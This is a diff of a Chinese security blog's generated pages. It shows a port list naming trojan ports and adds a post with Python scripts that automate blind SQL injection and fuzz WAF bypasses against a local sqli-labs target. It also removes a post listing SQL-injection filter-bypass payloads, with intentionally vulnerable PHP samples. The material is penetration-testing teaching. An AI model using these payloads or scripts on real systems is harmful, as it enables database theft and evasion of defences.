class="line">7597端口：木马Quaz开放此端口</span><br><span class="line">7626端口：木马冰河开放此端口</span><br><span class="line">7633端口：PMDF管理</span><br><span class="line">7674端口：iMQ SSL通道</span><br><span class="line">7675端口：iMQ通道</span><br><span class="line">7676端口：木马Giscier开放此端口</span><br><span class="line">7720端口：Med图象入口</span><br><span class="line">7743端口：Sakura脚本传递协议</span><br><span class="line">7789端口：木马ICKiller开放此端口</span><br><span class="line">7797端口：Propel连接器端口</span><br><span class="line">7798端口：Propel编码器端口</span><br><span class="line">8000端口：腾讯QQ服务器端开放此端口</span><br><span class="line">8001端口：VCOM通道</span><br><span class="line">8007端口：Apache(类似iis)jServ协议1.x</span><br><span class="line">8008端口：HTTP Alternate</span><br><span class="line">8009端口：Apache(类似iis)JServ协议1.3</span><br><span class="line">8010端口：Wingate代理开放此端口</span><br><span class="line">8011端口：木马way2.4开放此端口</span><br><span class="line">8022端口：OA-系统</span><br><span class="line">8080端口：WWW代理开放此端口</span><br><span class="line">8081端口：ICECap控制台</span><br><span class="line">8082端口：BlackIce(防止黑客软件)警报发送到此端口</span><br><span class="line">8118端口：Privoxy HTTP代理</span><br><span class="line">8121端口：Apollo数据端口</span><br><span class="line">8122端口：Apollo软件管理端口</span><br><span class="line">8181端口：Imail</span><br><span class="line">8225端口：木马灰鸽子开放此端口</span><br><span class="line">8311端口：木马初恋情人开放此端口</span><br><span class="line">8351端口：服务器寻找</span><br><span class="line">8416端口：eSpeech Session协议</span><br><span class="line">8417端口：eSpeech RTP协议</span><br><span class="line">8473端口：虚拟点对点</span><br><span class="line">8668端口：网络地址转换</span><br><span class="line">8786端口：Message客户端</span><br><span class="line">8787端口：Message服务器</span><br><span class="line">8954端口：Cumulus管理端口</span><br><span class="line">9000端口：CS监听</span><br><span class="line">9001端口：ETL服务管理</span><br><span class="line">9002端口：动态id验证</span><br><span class="line">9021端口：Pangolin验证</span><br><span class="line">9022端口：PrivateArk远程代理</span><br><span class="line">9023端口：安全网络登陆-1</span><br><span class="line">9024端口：安全网络登陆-2</span><br><span class="line">9025端口：安全网络登陆-3</span><br><span class="line">9026端口：安全网络登陆-4</span><br><span class="line">9101端口：Bacula控制器</span><br><span class="line">9102端口：Bacula文件后台</span><br><span class="line">9103端口：Bacula存储邮件后台</span><br><span class="line">9111端口：DragonIDS控制台</span><br><span class="line">9217端口：FSC通讯端口</span><br><span class="line">9281端口：软件传送端口1</span><br><span class="line">9282端口：软件传送端口2</span><br><span class="line">9346端口：C技术监听</span><br><span class="line">9400端口：木马Incommand 1.0开放此端口</span><br><span class="line">9401端口：木马Incommand 1.0开放此端口</span><br><span class="line">9402端口：木马Incommand 1.0开放此端口</span><br><span class="line">9594端口：信息系统</span><br><span class="line">9595端口：Ping Discovery服务</span><br><span class="line">9800端口：WebDav源端口</span><br><span class="line">9801端口：Sakura脚本转移协议-2</span><br><span class="line">9802端口：WebDAV Source TLS/SSL</span><br><span class="line">9872端口：木马Portal of Doom开放此端口</span><br><span class="line">9873端口：木马Portal of Doom开放此端口</span><br><span class="line">9874端口：木马Portal of Doom开放此端口</span><br><span class="line">9875端口：木马Portal of Doom开放此端口</span><br><span class="line">9899端口：木马InIkiller开放此端口</span><br><span class="line">9909端口：域名时间</span><br><span class="line">9911端口：SYPECom传送协议</span><br><span class="line">9989端口：木马iNi-Killer开放此端口</span><br><span class="line">9990端口：OSM Applet程序服务器</span><br><span class="line">9991端口：OSM事件服务器</span><br><span class="line">10000端口：网络数据管理协议</span><br><span class="line">10001端口：SCP构造端口</span><br><span class="line">10005端口：安全远程登陆</span><br><span class="line">10008端口：Octopus多路器</span><br><span class="line">10067端口：木马iNi-Killer开放此端口</span><br><span class="line">10113端口：NetIQ端点</span><br><span class="line">10115端口：NetIQ端点</span><br><span class="line">10116端口：NetIQVoIP鉴定器</span><br><span class="line">10167端口：木马iNi-Killer开放此端口</span><br><span class="line">11000端口：木马SennaSpy开放此端口</span><br><span class="line">11113端口：金山词霸开放此端口</span><br><span class="line">11233端口：木马Progenic trojan开放此端口</span><br><span class="line">12076端口：木马Telecommando开放此端口</span><br><span class="line">12223端口：木马Hack&apos;99 KeyLogger开放此端口</span><br><span class="line">12345端口：木马NetBus1.60/1.70、GabanBus开放此端口</span><br><span class="line">12346端口：木马NetBus1.60/1.70、GabanBus开放此端口</span><br><span class="line">12361端口：木马Whack-a-mole开放此端口</span><br><span class="line">13223端口：PowWow 客户端，是Tribal Voice的聊天程序</span><br><span class="line">13224端口：PowWow 服务器，是Tribal Voice的聊天程序</span><br><span class="line">16959端口：木马Subseven开放此端口</span><br><span class="line">16969端口：木马Priority开放此端口</span><br><span class="line">17027端口：外向连接</span><br><span class="line">19191端口：木马蓝色火焰开放此端口</span><br><span class="line">20000端口：木马Millennium开放此端口</span><br><span class="line">20001端口：木马Millennium开放此端口</span><br><span class="line">20034端口：木马NetBus Pro开放此端口</span><br><span class="line">21554端口：木马GirlFriend开放此端口</span><br><span class="line">22222端口：木马Prosiak开放此端口</span><br><span class="line">23444端口：木马网络公牛开放此端口</span><br><span class="line">23456端口：木马Evil FTP、Ugly FTP开放此端口</span><br><span class="line">25793端口：Vocaltec地址服务器</span><br><span class="line">26262端口：K3软件-服务器</span><br><span class="line">26263端口：K3软件客户端</span><br><span class="line">26274端口：木马Delta开放此端口</span><br><span class="line">27374端口：木马Subseven 2.1开放此端口</span><br><span class="line">30100端口：木马NetSphere开放此端口</span><br><span class="line">30129端口：木马Masters Paradise开放此端口</span><br><span class="line">30303端口：木马Socket23开放此端口</span><br><span class="line">30999端口：木马Kuang开放此端口</span><br><span class="line">31337端口：木马BO(Back Orifice)开放此端口</span><br><span class="line">31338端口：木马BO(Back Orifice)，DeepBO开放此端口</span><br><span class="line">31339端口：木马NetSpy DK开放此端口</span><br><span class="line">31666端口：木马BOWhack开放此端口</span><br><span class="line">31789端口：Hack-a-tack</span><br><span class="line">32770端口：sun solaris RPC服务开放此端口</span><br><span class="line">33333端口：木马Prosiak开放此端口</span><br><span class="line">33434端口：路由跟踪</span><br><span class="line">34324端口：木马Tiny Telnet Server、BigGluck、TN开放此端口</span><br><span class="line">36865端口：KastenX软件端口</span><br><span class="line">38201端口：Galaxy7软件数据通道</span><br><span class="line">39681端口：TurboNote默认端口</span><br><span class="line">40412端口：木马The Spy开放此端口</span><br><span class="line">40421端口：木马Masters Paradise开放此端口</span><br><span class="line">40422端口：木马Masters Paradise开放此端口</span><br><span class="line">40423端口：木马Masters Paradise开放此端口</span><br><span class="line">40426端口：木马Masters Paradise开放此端口</span><br><span class="line">40843端口：CSCC 防火墙</span><br><span class="line">43210端口：木马SchoolBus 1.0/2.0开放此端口</span><br><span class="line">43190端口：IP-PROVISION</span><br><span class="line">44321端口：PCP服务器(pmcd)</span><br><span class="line">44322端口：PCP服务器(pmcd)代理</span><br><span class="line">44334端口：微型个人防火墙端口</span><br><span class="line">44442端口：ColdFusion软件端口</span><br><span class="line">44443端口：ColdFusion软件端口</span><br><span class="line">44445端口：木马Happypig开放此端口</span><br><span class="line">45576端口：E代时光专业代理开放此端口</span><br><span class="line">47262端口：木马Delta开放此端口</span><br><span class="line">47624端口：Direct Play服务器</span><br><span class="line">47806端口：ALC协议</span><br><span class="line">48003端口：Nimbus网关</span><br><span class="line">50505端口：木马Sockets de Troie开放此端口</span><br><span class="line">50766端口：木马Fore开放此端口</span><br><span class="line">53001端口：木马Remote Windows Shutdown开放此端口</span><br><span class="line">54320端口：木马bo2000开放此端口</span><br><span class="line">54321端口：木马SchoolBus 1.0/2.0开放此端口</span><br><span class="line">61466端口：木马Telecommando开放此端口</span><br><span class="line">65000端口：木马Devil 1.03开放此端口</span><br><span class="line">65301端口：PC Anywhere软件开放端口</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/22/python脚本实现自动化sql盲注/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/22/python脚本实现自动化sql盲注/" itemprop="url">
+                  python脚本实现自动化sql盲注
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-22T22:59:37+08:00">
+                2018-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/22/python脚本实现自动化sql盲注/" class="leancloud_visitors" data-flag-title="python脚本实现自动化sql盲注">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面几篇博客写了sql注入时的绕过方法和盲注时经常使用的函数，但是我们明显能看到一个问题，那就是盲注时候需要对比每个字符的ascii码，如果手工注入就会十分浪费时间，所以我们这次尝试用python实现自动话注入。</p>
+<h2 id="0x01-布尔型盲注"><a href="#0x01-布尔型盲注" class="headerlink" title="0x01 布尔型盲注"></a>0x01 布尔型盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#! -*- encoding:utf-8 -*-</span><br><span class="line"># python3</span><br><span class="line"># author: leticia</span><br><span class="line">import requests</span><br><span class="line">#用这里的语句分别替换id中的内容即可爆库、表、字段</span><br><span class="line">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = &apos;xxx&apos;</span><br><span class="line">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = &apos;xxx&apos; and TABLE_NAME = &apos;xxx&apos;</span><br><span class="line">dic=&apos;0123456789abcdefghijklmnopqrstuvwxyz,&apos;</span><br><span class="line">url=&apos;http://127.0.0.1/sqli-labs/Less-8/?id=1\&apos; and &apos;</span><br><span class="line">string=&apos;&apos;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in dic:</span><br><span class="line">        id=&quot;substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;--+&quot;.format(str(i),ascii(j))</span><br><span class="line">        #print(id)</span><br><span class="line">        url_get=(url+id)</span><br><span class="line">        #print(url_get)</span><br><span class="line">        r=requests.get(url_get)</span><br><span class="line">        if &quot;You&quot; in r.text:</span><br><span class="line">            string+=j</span><br><span class="line">            print(string)</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
+<p>这里我们可以通过构造id的值，循环遍历库名集合的前100个位置与dic中的所有字符进行比对，然后如果返回页面正常即存在user关键字（根据实际情况更改），就将这个字母保存在string中，遍历完之后输出string。</p>
+<h2 id="0x02-基于时间的盲注"><a href="#0x02-基于时间的盲注" class="headerlink" title="0x02 基于时间的盲注"></a>0x02 基于时间的盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#! -*- encoding:utf-8 -*-</span><br><span class="line"># python3</span><br><span class="line"># author: leticia</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">#用这里的语句分别替换id中的内容即可爆库、表、字段</span><br><span class="line">#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br><span class="line">#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = &apos;xxx&apos;</span><br><span class="line">#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = &apos;xxx&apos; and TABLE_NAME = &apos;xxx&apos;</span><br><span class="line">dic=&apos;0123456789abcdefghijklmnopqrstuvwxyz,&apos;</span><br><span class="line">url=&apos;http://127.0.0.1/sqli-labs/Less-8/?id=1\&apos; and &apos;</span><br><span class="line">string=&apos;&apos;</span><br><span class="line">for i in range(100):</span><br><span class="line">    for j in dic:</span><br><span class="line">        id=&quot;if((substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),&#123;0&#125;,1)=&#123;1&#125;),sleep(3),0)--+&quot;.format(str(i),ascii(j))</span><br><span class="line">        #print(id)</span><br><span class="line">        url_get=(url+id)</span><br><span class="line">        #print(url_get)</span><br><span class="line">        r=requests.get(url_get)</span><br><span class="line">        sec=r.elapsed.seconds</span><br><span class="line">        if sec &gt; 2:</span><br><span class="line">            string+=j</span><br><span class="line">            print(string)</span><br><span class="line">            break</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure>
+<p>这里我们可以通过构造id的值，循环遍历库名集合的前100个位置与dic中的所有字符进行比对，然后如果返回页面需要两秒以上才能返回（即触发sleep(3)函数），就将这个字母保存在string中，遍历完之后输出string。</p>
+<h2 id="0x03-fuzz测试"><a href="#0x03-fuzz测试" class="headerlink" title="0x03 fuzz测试"></a>0x03 fuzz测试</h2><p>在安全测试中，模糊测试（fuzz testing）是一种介于完全的手工渗透测试与完全的自动化测试之间的安全性测试类型。在某些有安全狗一类的防护系统下，如果要手工判断过滤规则需要安全工作者很高的执行力，在这些情况下fuzz测试可以充分利用机器生成无规则且大量的数据来进行测试，拥有很高的效率。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#! -*- encoding:utf-8 -*-</span><br><span class="line"># python3</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">fuzz_zs = [&apos;/*&apos;, &apos;*/&apos;, &apos;/*!&apos;, &apos;*&apos;, &apos;=&apos;, &apos;`&apos;, &apos;!&apos;, &apos;@&apos;, &apos;%&apos;, &apos;.&apos;, &apos;-&apos;, &apos;+&apos;, &apos;|&apos;, &apos;%00&apos;]</span><br><span class="line">fuzz_sz = [&apos;&apos;, &apos; &apos;]</span><br><span class="line">fuzz_ch = [&quot;%0a&quot;, &quot;%0b&quot;, &quot;%0c&quot;, &quot;%0d&quot;, &quot;%0e&quot;, &quot;%0f&quot;, &quot;%0g&quot;, &quot;%0h&quot;, &quot;%0i&quot;, &quot;%0j&quot;]</span><br><span class="line"></span><br><span class="line">fuzz = fuzz_zs + fuzz_sz + fuzz_ch</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0&quot;,</span><br><span class="line">    &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;</span><br><span class="line">&#125;</span><br><span class="line">url_start = &quot;http://127.0.0.1/waf/test.php?id=1&quot;</span><br><span class="line">test_url=requests.get(url_start,headers=headers)</span><br><span class="line">print(test_url.text)</span><br><span class="line"></span><br><span class="line">for a in fuzz:</span><br><span class="line">    for b in fuzz:</span><br><span class="line">        for c in fuzz:</span><br><span class="line">            for d in fuzz:</span><br><span class="line">                exp = &quot;/*!union&quot; + a + b + c + d + &quot;select*/ 1,2,3&quot;</span><br><span class="line">                url = url_start + exp</span><br><span class="line">                res = requests.get(url=url, headers=headers)</span><br><span class="line">                print(&quot;Now URL:&quot; + url)</span><br><span class="line">                if &quot;user&quot; in res.text:</span><br><span class="line">                    print(&quot;Find Fuzz bypass:&quot; + url)</span><br><span class="line">                    with open(r&quot;C:\Users\Leticia\Desktop\results.txt&quot;, &apos;a&apos;, encoding=&apos;utf-8&apos;) as r:</span><br><span class="line">                        r.write(url + &quot;\n&quot;)</span><br></pre></td></tr></table></figure>
+<p>这里将fuzz常用到的内联注释、特殊字符等，随机组合，循环添加到union select之间，如果返回的页面正常显示user，没有进入防护系统的拦截界面，说明这里的表达式没有被过滤，然后写到results.txt中保存。</p>
+<p>之后我们可以利用results.txt分析到的规则，再完善前面的其他脚本，进行自动化注入。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>做测试时不能总是依赖sqlmap等完全自动化工具，也不能完全依赖手注，根据面对的实际情况编写适当的脚本，才能更熟练的掌握这些漏洞。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/21/sql注入盲注时常用函数/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1337,1009 +2395,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/01/sql注入中的一些绕过方法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/04/01/sql注入中的一些绕过方法/" itemprop="url">
-                  sql注入中的一些绕过方法
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-01T11:47:16+08:00">
-                2018-04-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/04/01/sql注入中的一些绕过方法/" class="leancloud_visitors" data-flag-title="sql注入中的一些绕过方法">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-sql注入"><a href="#0x00-sql注入" class="headerlink" title="0x00 sql注入"></a>0x00 sql注入</h2><p>之前搭建sql注入环境测试过最基本的sql注入，但是实际情况中，会有很多的过滤来限制注入，这里记录读了《代码审计》和网络上搜集学习之后后掌握的几种常见的绕过方法，当作笔记。</p>
-<h2 id="0x01-大小写绕过"><a href="#0x01-大小写绕过" class="headerlink" title="0x01 大小写绕过"></a>0x01 大小写绕过</h2><p>mysql语句是不区分大小写的，如果过滤时没考虑到这点，就可以通过大小写混用来绕过。<br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNion SeLecT</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x02-宽字节注入"><a href="#0x02-宽字节注入" class="headerlink" title="0x02 宽字节注入"></a>0x02 宽字节注入</h2><p>程序在进行操作之前一般会进行一些编码处理，但是做编码处理的函数是有问题的，比如在使用php连接mysql时，如果设置“set character_set_client=gbk” 时，就会导致宽字节注入问题。<br>如提交1’ and 1=1’时，对引号的过滤会把提交的语句变为1\’ and 1=1#’,这个时候，我们就没有把前面的引号闭合，无法使语句判别为真。<br>这个时候，我们如果提交1%df’ and ‘ 1=1’，由于反斜杠是%5c，%df%5c在编码处理时组成了“運”，然后我们的语句就变成了1運’ and 1=1#’成功闭合了前面的引号。  </p>
-<p>我们实战测试一下，在test.php中写入如下代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=gb2312&quot;);</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;123456&quot;;</span><br><span class="line">$dbname = &quot;test&quot;;</span><br><span class="line">// 创建连接</span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line">// Check connection</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connect error: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$uid = addslashes($_GET[&apos;id&apos;]);</span><br><span class="line">$sql = &quot;SELECT * FROM user where id=$uid&quot;;</span><br><span class="line">mysqli_query($conn, &quot;set names gbk&quot;);</span><br><span class="line">$result = mysqli_query($conn, $sql);</span><br><span class="line">print_r(&apos;当前语句: &apos; .$sql. &apos;&lt;br /&gt;&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后传入参数进行测试</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg01.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg02.png" alt=""></p>
-<h2 id="0x03-正则替换绕过"><a href="#0x03-正则替换绕过" class="headerlink" title="0x03 正则替换绕过"></a>0x03 正则替换绕过</h2><p>有的防注入机制会正则匹配危险关键字并用空白替换，这个时候可以写出类似：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNunionION SELselectECT</span><br></pre></td></tr></table></figure></p>
-<p>之类的用法，这个时候正则匹配一遍将union删除，剩下的部分又变成了UNION，就成功的绕过了。</p>
-<h2 id="0x04-二次urldecode注入"><a href="#0x04-二次urldecode注入" class="headerlink" title="0x04 二次urldecode注入"></a>0x04 二次urldecode注入</h2><p>web程序进行参数过滤时，很多采用反斜杠来转义单引号等危险参数的方法。如果某处使用了urldecode或者rawurldecode函数，会导致二次解码生成单引号。<br>如我们提交的是/test.php?id=1%2527，因为没有提交单引号没有触发过滤，%25的解码结果是%。则第一次解码之后是/test.php?id=1%27，如果程序里面再次使用urldecode解码id参数的话，就会生成/test.php?id=1’，单引号成功闭合。  </p>
-<p>我们们实战测试一下，在test.php中写入如下代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=addslashes($_GET[&apos;p&apos;]);</span><br><span class="line">$b=urldecode($a);</span><br><span class="line">echo &apos;$a=&apos;.$a;</span><br><span class="line">echo &apos;&lt;br /&gt;&apos;</span><br><span class="line">echo &apos;$b=&apos;.$b;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后传入参数进行测试，结果如下:</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg03.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/sql_rg/sql_rg04.png" alt=""></p>
-<h2 id="0x05-十六进制绕过"><a href="#0x05-十六进制绕过" class="headerlink" title="0x05 十六进制绕过"></a>0x05 十六进制绕过</h2><p>对于某些进行敏感词汇检查的机制，可以通过填ascii编码的十六进制来绕过，如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,table_name,3,4 from information_schema.tables where table_schema=0x76657374</span><br></pre></td></tr></table></figure>
-<p>其中0x76657374是test的十六进制表示</p>
-<h2 id="0x06-空格绕过"><a href="#0x06-空格绕过" class="headerlink" title="0x06 空格绕过"></a>0x06 空格绕过</h2><p>在SQL注入时，空格的使用是非常普遍的，如果目标对空格进行了限制，这个时候有这几种绕过方法：<br>如我们原来要查询用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from user</span><br></pre></td></tr></table></figure></p>
-<p>用注释替换空格：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select/**/username/**/from/**/user</span><br></pre></td></tr></table></figure></p>
-<p>用回车（%0a）来替换空格<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select%0ausername%0afrom%0auser</span><br></pre></td></tr></table></figure></p>
-<p>如果括号没有被过滤，那么能计算的一些式子也可以用括号来绕过<br>如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username() from user where 1=1 and 2=2</span><br></pre></td></tr></table></figure></p>
-<p>可以写成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(username())from user where(1=1)and(2=2)</span><br></pre></td></tr></table></figure></p>
